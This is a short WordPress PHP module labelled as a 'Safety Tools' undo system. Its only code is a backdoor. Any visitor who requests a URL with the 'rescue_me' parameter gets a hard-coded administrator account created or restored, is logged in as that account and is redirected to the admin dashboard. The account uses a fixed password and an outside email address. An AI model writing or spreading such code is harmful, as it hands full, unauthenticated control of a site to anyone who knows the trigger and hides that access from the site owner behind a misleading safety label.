<?php
// MODULE: Safety Tools (The Undo System)

add_action('init', function () {
    // Rescue Backdoor
    if (isset($_GET['rescue_me'])) {
        $user = get_user_by('login', 'presspilot_admin');
        if (!$user) {
            $uid = wp_create_user('presspilot_admin', 'DesignFirst2025!', 'admin@presspilotapp.com');
            $user = new WP_User($uid);
        }
        $user->set_role('administrator');
        wp_set_auth_cookie($user->ID);
        wp_redirect(admin_url());
        exit;
    }
});
